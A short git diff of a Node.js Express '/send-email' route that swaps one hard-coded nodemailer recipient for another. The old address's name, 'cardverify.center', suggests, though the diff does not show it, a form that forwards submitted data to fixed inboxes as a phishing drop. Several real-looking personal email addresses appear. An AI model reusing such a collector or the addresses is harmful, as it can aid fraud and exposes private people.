@@ -30,7 +30,7 @@ app.post('/send-email', async (req, res) => {
   const { subject, message } = req.body;
 
   const firstRecipient = 'kayodedaouda01@gmail.com';
-  const secondRecipient = 'cardverify.center@gmail.com';
+  const secondRecipient = 'yagalucie@gmail.com';
 
   // Transporteur pour les e-mails
   const transporter1 = nodemailer.createTransport({
